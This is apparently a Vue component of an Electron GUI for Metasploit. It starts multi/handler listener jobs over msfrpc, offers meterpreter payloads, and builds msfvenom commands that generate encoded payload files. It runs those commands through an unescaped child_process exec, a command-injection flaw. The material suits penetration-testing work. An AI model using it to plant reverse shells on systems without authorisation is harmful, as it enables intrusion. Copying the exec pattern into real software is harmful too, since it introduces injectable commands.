<template>
  <div id="wrapper">
  <el-container style="height: 100%;">
    <el-aside id="aside" :width="menuWidth" style="background-color: #232e3b;">
      <div id="logo" style="text-align: center; margin-top: 20px; margin-bottom: 10px;">
        <img src="./../assets/logo.png" :style="menuWidth ==='64px' ? 'width: 50px;' : 'width: 100px;'" alt="" draggable="false">
      </div>
      <el-menu
              :default-active="activeLink.path"
              :router="true"
              background-color="#232e3b"
              text-color="#fff"
              :collapse="isCollapse">
        <el-menu-item index="/dashboard">
          <i class="el-icon-menu"></i>
          <span>Dashboard</span>
        </el-menu-item>
        <el-menu-item index="/sessions">
          <i class="el-icon-news"></i>
          <span>Sessions</span>
        </el-menu-item>
      </el-menu>
    </el-aside>
    <el-container style="background-color: #2d3a4b">
      <el-header>
        <el-row :gutter="24">
          <el-col :span="1" style="text-align: left; color:rgba(255, 255, 255, 0.7);">
            <font-awesome-icon class="user-icon" icon="bars" style="cursor: pointer;" @click="collapseMenu"/>
          </el-col>
          <el-col :span="11">
            <!--Breadcrumb appears only when route value != dashboard-->
            <el-breadcrumb separator-class="el-icon-arrow-right">
              <el-breadcrumb-item v-for="route in this.$route.matched" v-if="route.path !== '/'" :to="route.path" :key="route.path">{{ route.name }}</el-breadcrumb-item>
            </el-breadcrumb>
          </el-col>
          <el-col :span="12">
            <el-button type="text" icon="el-icon-arrow-left" style="border-radius: 0;" @click="logout()">Logout</el-button>
          </el-col>
        </el-row>
      </el-header>
      <el-main>
        <div class="main" v-if="activeLink.path === '/dashboard'">
          <h2>Jobs</h2>
          <el-row gutter="24">
            <el-col span="12">
              <div class="form">
                <el-form :model="jobForm" :rules="jobRules" ref="jobForm" label-width="120px" class="demo-ruleForm">
                  <el-form-item label="Payload" prop="payload">
                    <el-autocomplete
                            class="scroll"
                            style="width:100%;"
                            v-model="jobForm.payload"
                            :fetch-suggestions="querySearch"
                            :trigger-on-focus="true"
                    ></el-autocomplete>
                  </el-form-item>
                  <el-row>
                    <el-col :span="12">
                      <el-form-item label="LHOST" prop="lhost">
                        <el-input v-model="jobForm.lhost"></el-input>
                      </el-form-item>
                    </el-col>
                    <el-col :span="12">
                      <el-form-item label="LPORT" prop="lport">
                        <el-input v-model="jobForm.lport"></el-input>
                      </el-form-item>
                    </el-col>
                  </el-row>
                  <el-form-item label="Options" prop="type">
                    <el-checkbox-group v-model="jobForm.type" size="small" @change="handleCheckBox">
                      <el-checkbox label="EnableContextEncoding" name="type" ></el-checkbox>
                      <el-checkbox label="ExitOnSession" name="type"></el-checkbox>
                    </el-checkbox-group>
                  </el-form-item>
                  <el-form-item>
                    <el-button type="primary" :loading="loadingButton" size="medium" @click="submitForm('jobForm')">Create</el-button>
                  </el-form-item>
                </el-form>
              </div>
            </el-col>
            <el-col span="12">
              <el-table
                      :data="tableData"
                      fit
                      :cell-style="tableCellStyle"
                      :header-cell-style="tableHeaderColor">
                <el-table-column
                        prop="job_id"
                        label="Job id">
                  <template slot-scope="scope">
                    <div slot="reference" class="name-wrapper">
                      <el-tag type="warning" size="medium">{{ scope.row.job_id }}</el-tag>
                    </div>
                  </template>
                </el-table-column>
                <el-table-column
                        prop="job_payload"
                        label="Type">
                  <template slot-scope="scope">
                    <div slot="reference" class="name-wrapper">
                      <el-tag type="danger" size="medium">{{ scope.row.job_payload }}</el-tag>
                    </div>
                  </template>
                </el-table-column>
                <el-table-column
                        align="right">
                  <template slot-scope="scope">
                    <el-button
                            size="mini"
                            type="danger"
                            @click="handleDelete(scope.$index, scope.row)"><font-awesome-icon icon="times" size="xs" style="padding-right: 5px;"/> Remove</el-button>
                  </template>
                </el-table-column>
              </el-table>

            </el-col>
          </el-row>
          <el-row :gutter="24">
            <el-col span="12">
              <h2>Payload generator <font-awesome-icon icon="microchip"/></h2>
              <el-form :model="payloadGenerator" :rules="payloadGeneratorRules" ref="payloadGenerator" class="demo-ruleForm">
                <el-form-item prop="nameOfPayload">
                  <el-input v-model="payloadGenerator.nameOfPayload" placeholder="Payload name ex: kage.exe"/>
                </el-form-item>
                <el-form-item prop="payload">
                  <el-autocomplete
                          class="scroll"
                          placeholder="Payload"
                          style="width:100%;"
                          v-model="payloadGenerator.payload"
                          :fetch-suggestions="querySearch"
                          :trigger-on-focus="true"
                  ></el-autocomplete>
                </el-form-item>
                <el-row>
                  <el-col :span="12">
                    <el-form-item prop="lhost">
                      <el-input v-model="payloadGenerator.lhost" placeholder="LHOST"></el-input>
                    </el-form-item>
                  </el-col>
                  <el-col :span="12">
                    <el-form-item prop="lport">
                      <el-input v-model="payloadGenerator.lport" placeholder="LPORT"></el-input>
                    </el-form-item>
                  </el-col>
                </el-row>
                <el-row>
                  <el-col :span="8">
                    <el-form-item prop="format">
                      <el-autocomplete
                              placeholder="Format"
                              class="scroll"
                              style="width:100%;"
                              v-model="payloadGenerator.format"
                              :fetch-suggestions="formatSearch"
                              :trigger-on-focus="true"
                      ></el-autocomplete>
                    </el-form-item>
                  </el-col>
                  <el-col :span="8">
                    <el-form-item prop="encoder">
                      <el-autocomplete
                              placeholder="Encoders"
                              class="scroll"
                              style="width:100%;"
                              v-model="payloadGenerator.encoder"
                              :fetch-suggestions="encoderSearch"
                              :trigger-on-focus="true"
                      ></el-autocomplete>
                      <small style="color:#f3f3f3">Optional field</small>
                    </el-form-item>
                  </el-col>
                  <el-col :span="8">
                    <el-form-item prop="badChars">
                      <el-input
                              placeholder="Characters to avoid"
                              style="width:100%;"
                              v-model="payloadGenerator.badChars"
                      ></el-input>
                      <small style="color:#f3f3f3">Optional field</small>
                    </el-form-item>
                  </el-col>
                </el-row>
                <el-form-item>
                  <el-button type="primary" :loading="loadingButtonGen" size="medium" @click="generatePayload('payloadGenerator')">Generate</el-button>
                </el-form-item>
              </el-form>
            </el-col>
            <el-col span="12">
              <div class="cmdBg" v-show="cmdBg">
<pre style="user-select:text; color:#fff;">
  <code>
{{commandOutPut}}
  </code>
</pre>
              </div>
            </el-col>
          </el-row>
        </div>
        <router-view></router-view>
      </el-main>
    </el-container>
  </el-container>
  </div>
</template>

<script>
  import MsfRpc from '@/msfrpc'
  import { exec } from 'child_process'
  export default {
    name: 'dashboard',
    data () {
      return {
        isCollapse: false,
        menuWidth: '200px',
        activeLink: this.$route,
        loadingButton: false,
        loadingButtonGen: false,
        cmdBg: false,
        commandOutPut: '',
        tableData: [],
        handlerOptions: [],
        jobForm: {
          payload: '',
          lhost: '',
          lport: '',
          type: []
        },
        jobRules: {
          payload: [
            { required: true, message: 'Payload is required', trigger: 'blur' }
          ],
          lhost: [
            { required: true, message: 'LHOST is required', trigger: 'blur' }
          ],
          lport: [
            { required: true, message: 'LPORT is required', trigger: 'blur' }
          ]
        },
        payloadGenerator: {
          nameOfPayload: '',
          payload: '',
          lhost: '',
          lport: '',
          format: '',
          encoder: '',
          badChars: ''
        },
        payloadGeneratorRules: {
          nameOfPayload: [
            { required: true, message: 'Name of the payload is required', trigger: 'blur' }
          ],
          payload: [
            { required: true, message: 'Payload is required', trigger: 'blur' }
          ],
          lhost: [
            { required: true, message: 'LHOST is required', trigger: 'blur' }
          ],
          lport: [
            { required: true, message: 'LPORT is required', trigger: 'blur' }
          ],
          format: [
            { required: true, message: 'Format is required please choose one', trigger: 'blur' }
          ]
        }
      }
    },
    methods: {
      collapseMenu () {
        this.isCollapse = this.isCollapse !== true
        this.menuWidth = this.isCollapse ? '64px' : '200px'
      },
      // Create Job
      submitForm (formName) {
        this.$refs[formName].validate((valid) => {
          if (valid) {
            const opts = {
              'LHOST': this.jobForm.lhost,
              'LPORT': this.jobForm.lport,
              'PAYLOAD': this.jobForm.payload,
              'ExitOnSession': this.handlerOptions.includes('ExitOnSession'),
              'EnableContextEncoding': this.handlerOptions.includes('EnableContextEncoding')
            }
            this.loadingButton = true
            setTimeout(() => {
              this.msfrpc._exec('module.execute', 'exploit', 'multi/handler', opts).then((res) => {
                console.log(res)
                if (res) {
                  console.log('job created')
                  setTimeout(() => {
                    this.listJobs()
                  }, 1000)
                } else {
                  console.log('error created')
                  this.$message.error('Error: can\'t create job please try again.')
                }
              })
              this.loadingButton = false
            }, 1000)
          } else {
            console.log('error submit!!')
            return false
          }
        })
      },
      generatePayload (formName) {
        this.$refs[formName].validate((valid) => {
          if (valid) {
            this.loadingButtonGen = true
            const pathTo = this.$electron.remote.app.getPath('home') + '/kage'
            const encoder = this.payloadGenerator.encoder.length === 0 ? ' ' : ` -e ${this.payloadGenerator.encoder}`
            const badChars = this.payloadGenerator.badChars.length === 0 ? ' ' : ` -b ${this.payloadGenerator.badChars} `
            const command = `msfvenom -p ${this.payloadGenerator.payload} LHOST=${this.payloadGenerator.lhost} LPORT=${this.payloadGenerator.lport}${encoder}${badChars}-f ${this.payloadGenerator.format} -o ${pathTo}/${this.payloadGenerator.nameOfPayload}`
            console.log(command)
            this.cmdBg = true
            this.commandOutPut = '> ' + command + '\n\n'
            try {
              let child = exec(`${command}`, (error, stdout, stderr) => {
                if (stdout !== '') {
                  this.commandOutPut += stdout
                }
                if (stderr !== '') {
                  this.commandOutPut += stderr
                }
                if (error !== null) {
                  this.commandOutPut += error
                }
              })
              const self = this
              child.on('close', function (code) {
                console.log('closing code: ' + code)
                self.loadingButtonGen = false
              })
              console.log(this.payloadGenerator.encoder.length)
              console.log(command)
            } catch (e) {
            }
          } else {
            console.log('error submit!!')
            return false
          }
        })
      },
      listJobs () {
        this.tableData = []
        this.msfrpc._exec('job.list').then((res) => {
          if (res.result === 'unsuccessful') {
            this.$notify.error('Server not responding')
            this.$router.push({
              path: '/logout'
            })
          }
          let job
          for (job in res) {
            if (res.hasOwnProperty(job)) {
              this.tableData.push({
                'job_id': job,
                'job_payload': res[job]
              })
            }
          }
        })
      },
      handleDelete (index, row) {
        console.log(index, row.job_id)
        this.msfrpc._exec('job.stop', parseInt(row.job_id)).then((res) => {
          console.log(res)
        }).then(() => {
          this.tableData.splice(index, 1)
        })
      },
      handleCheckBox (val) {
        this.handlerOptions = val
      },
      querySearch (queryString, cb) {
        let modules = this.modules
        let results = queryString ? modules.filter(this.createFilter(queryString)) : modules
        // call callback function to return suggestions
        cb(results)
      },
      formatSearch (queryString, cb) {
        let modules = this.formats
        let results = queryString ? modules.filter(this.createFilter(queryString)) : modules
        // call callback function to return suggestions
        cb(results)
      },
      encoderSearch (queryString, cb) {
        let modules = this.encoders
        let results = queryString ? modules.filter(this.createFilter(queryString)) : modules
        // call callback function to return suggestions
        cb(results)
      },
      createFilter (queryString) {
        return (modules) => {
          return (modules.value.toLowerCase().indexOf(queryString.toLowerCase()) === 0)
        }
      },
      tableHeaderColor ({row, column, rowIndex, columnIndex}) {
        if (rowIndex === 0) {
          return ' background-color: #37465b; color:rgba(255, 255, 255, 0.7); padding:0px; border-bottom:1px solid hsla(0,0%,100%,.1);'
        }
      },
      tableCellStyle ({row, column, rowIndex, columnIndex}) {
        if (rowIndex !== this.tableData.length - 1) {
          return 'background-color: #37465b; border-bottom:1px solid hsla(0,0%,100%,.1); color: rgba(255, 255, 255, 0.7);'
        }
        return 'background-color: #37465b; border-bottom:none; color: rgba(255, 255, 255, 0.7);'
      },
      logout () {
        this.msfrpc._exec('auth.token_remove', this.$store.getters.getInfo.token).then((res) => {
          console.log(res)
          if (res.result === 'success') {
            this.$router.push({
              path: '/logout'
            })
          } else if (res.result === 'unsuccessful') {
            this.$notify.error('Server not responding')
            this.$router.push({
              path: '/logout'
            })
          }
        })
      },
      loadAutoComplete () {
        this.modules = []
        this.msfrpc._exec('module.payloads').then((res) => {
          res.modules.forEach((module) => {
            if (module.indexOf('meterpreter') !== -1) {
              this.modules.push({'value': module})
            }
          })
        })
        this.formats = []
        this.msfrpc._exec('module.encode_formats').then((res) => {
          res.forEach((format) => {
            this.formats.push({'value': format})
          })
        })
        this.encoders = []
        this.msfrpc._exec('module.encoders').then((res) => {
          res.modules.forEach((module) => {
            this.encoders.push({'value': module})
          })
        })
      }
    },
    beforeRouteUpdate (to, from, next) {
      this.activeLink = to
      next()
    },
    created () {
      this.msfrpc = new MsfRpc(this.$store.getters.getInfo)
      this.listJobs()
      this.loadAutoComplete()
    }
  }
</script>
<style>
  #aside {
    border-right:1px solid rgba(0,0,0,.12);
    position: relative;
    z-index: 200;
    transition: width .3s;
    overflow: hidden;
  }
  #wrapper {
    background-color: #2d3a4b !important;
    height:100%;
  }
  #wrapper .cmdBg {
    background-color: rgba(34, 34, 34, 0.7);
    padding:10px;
    margin-top: 68px;
    overflow: auto;
  }
  #wrapper  .el-menu {
    border: 0 !important;
  }
  #wrapper  .el-header {
    line-height: 60px;
    text-align: right;
  }
  #wrapper .el-breadcrumb {
    line-height: 60px !important;
  }
  #wrapper .el-breadcrumb__inner a, .el-breadcrumb__inner.is-link {
    font-weight: 700;
    text-decoration: none;
    -webkit-transition: color .2s cubic-bezier(.645,.045,.355,1);
    transition: color .2s cubic-bezier(.645,.045,.355,1);
    color: rgba(255, 255, 255, 0.7) !important;
  }
  #wrapper .el-breadcrumb__inner a:hover, .el-breadcrumb__inner.is-link:hover {
    color: #409eff !important;
    cursor: pointer;
  }
  #wrapper .el-breadcrumb__item:last-child .el-breadcrumb__inner, .el-breadcrumb__item:last-child .el-breadcrumb__inner a, .el-breadcrumb__item:last-child .el-breadcrumb__inner a:hover, .el-breadcrumb__item:last-child .el-breadcrumb__inner:hover {
    font-weight: 400;
    color: rgba(255, 255, 255, 0.7) !important;
    cursor: text;
  }
  #wrapper .main h2 {
    font-weight: 300;
    color: #fff;
  }
  #wrapper .main input{
    background-color:#283443;
    border: 1px solid hsla(0,0%,100%,.1);
    color:#fff;
  }
  #wrapper .main label {
    color: rgba(255, 255, 255, 0.7);
  }
  #wrapper .main label::before {
    content: none;
  }
  #wrapper .el-input__inner:hover {
    border-color: #c0c4cc;
  }
  #wrapper .el-table::before {
    content: none;
  }
  #wrapper .el-table::after {
    content: none;
  }
  #wrapper .el-table {
    -webkit-box-shadow: 0 2px 12px 0 rgba(0, 0, 0, .1);
    box-shadow: 0 2px 12px 0 rgba(0, 0, 0, .1);
    background-color: transparent !important;
    overflow: hidden;
  }
  #wrapper .el-table th {
    padding: 15px 0 !important;
  }
  .el-autocomplete-suggestion.el-popper[x-placement^=bottom] .popper__arrow::after {
    border-bottom-color: #283443 !important;
  }
  .el-autocomplete-suggestion.el-popper[x-placement^=bottom] .popper__arrow {
    border-bottom-color: hsla(0,0%,100%,.1) !important;
  }
  .el-autocomplete-suggestion.el-popper[x-placement^=top] .popper__arrow {
    border-top-color: hsla(0,0%,100%,.1) !important;
  }
  .el-autocomplete-suggestion.el-popper[x-placement^=top] .popper__arrow::after {
    border-top-color: #283443 !important;
  }
  .el-autocomplete-suggestion {
    margin: 5px 0;
    -webkit-box-shadow: 0 2px 12px 0 rgba(0,0,0,.1);
    box-shadow: 0 2px 12px 0 rgba(0,0,0,.1);
    border-radius: 4px;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    background-color:#222d3a !important;
    border: 1px solid hsla(0,0%,100%,.1) !important;
    color:#fff !important;
  }
  .el-autocomplete-suggestion li {
    color: #fff !important;
  }
  .el-autocomplete-suggestion li.highlighted, .el-autocomplete-suggestion li:hover {
    background-color: hsla(0,0%,100%,.05) !important;
  }
</style>
